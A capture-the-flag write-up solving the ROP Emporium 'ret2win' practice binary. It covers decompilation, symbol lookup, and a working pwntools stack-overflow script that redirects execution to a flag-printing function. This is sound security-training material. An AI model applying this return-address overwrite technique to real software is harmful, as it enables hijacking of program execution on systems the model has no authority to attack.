# Writeup: ret2win

## Introduction

In this challenge we are only given a binary and a flag file. First we will use checksec to figure out what restrictions the binary has.
```
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
    Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               3   ./ret2win
```
Since the binary has no PIE we can go into gdb and use any addresses we find without any modification. This will be important later when we go looking for the flag. Since we have no source code to work with I will reverse engineer it function by function starting with main.

```
    int main(int argc, char** argv)
    {
            setvbuf(stdout, 0, 2, 0);
            puts("ret2win by ROP Emporium");
            puts("x86_64\n");
            pwnme();
            puts("\nExiting")
            return 0;
    }
```

As you can see main calls the pwnme function so we will have to translate that next.

```
    void pwnme()
    {
            char buffer[32];
            memset(buffer, 0, 32);
            puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
            puts("What could possibly go wrong?");
            puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
            printf("> ");
            read(0, buffer, 56);
            puts("Thank you!");
    }

```

## Finding The Flag

Here we have our vulnerability: A buffer that can be overflowed through the read function. The only question is where should we return to? There is no flag in this function either. To find out what other functions there are I will use nm to see if I can find anything interesting in the binary.

```
    $ nm ret2win | grep "t"
    0000000000400800 R _IO_stdin_used
    0000000000601058 B __bss_start
    0000000000601048 D __data_start
    0000000000400660 t __do_global_dtors_aux
    0000000000600e18 d __do_global_dtors_aux_fini_array_entry
    0000000000600e10 d __frame_dummy_init_array_entry
                     w __gmon_start__
    0000000000600e18 d __init_array_end
    0000000000600e10 d __init_array_start
    0000000000400780 T __libc_csu_init
                     U __libc_start_main@@GLIBC_2.2.5
    00000000004005e0 T _dl_relocate_static_pie
    0000000000601058 D _edata
    0000000000400528 T _init
    00000000004005b0 T _start
    0000000000601060 b completed.7698
    0000000000601048 W data_start
    00000000004005f0 t deregister_tm_clones
    0000000000400690 t frame_dummy
                     U memset@@GLIBC_2.2.5
                     U printf@@GLIBC_2.2.5
                     U puts@@GLIBC_2.2.5
    00000000004006e8 t pwnme
    0000000000400620 t register_tm_clones
    0000000000400756 t ret2win
                     U setvbuf@@GLIBC_2.2.5
    0000000000601058 B stdout@@GLIBC_2.2.5
                     U system@@GLIBC_2.2.5
```
As you can see there is a ret2win symbol in the binary that likely corresponds to a function we need to return to. First we will dissassemble it in gdb and then translate it to see if our intuition is correct.

```
    void ret2win()
    {
            puts("Well done! Here's your flag!");
            system("/bin/cat flag.txt");
    }

```
And it is correct! So now all we need to do is to find the address of the ret2win function in gdb and then write the pwn tools script.
```
    gef➤  p ret2win
    $1 = {<text variable, no debug info>} 0x400756 <ret2win>
```

## Writing the Script

As you can see the address is 0x400756. Now all that is left is to write the script.

```
    from pwn import *

    e = ELF('./ret2win')
    p = process('./ret2win')

    rop = ROP(e)

    ret = rop.find_gadget(['ret'])[0]

    padding = b'A' * 40
    payload = padding + p64(ret) + p64(e.symbols['ret2win'])

    p.sendlineafter(b'> ', payload)
    p.interactive()
```

## Results

I added a padding of 40 after messing with the size (originally I had it sized at 32 bytes because that was the size of the buffer) and finding the flag. Now we can run the script and obtain the flag.

```
    [*] '/mnt/c/Users/18506/Desktop/CTF/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    [+] Starting local process './ret2win': pid 46719
    [*] Loading gadgets for '/mnt/c/Users/18506/Desktop/CTF/ret2win/ret2win'
    [*] Switching to interactive mode
    Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
```

Finally, we have our flag:

`ROPE{a_placeholder_32byte_flag!}` 
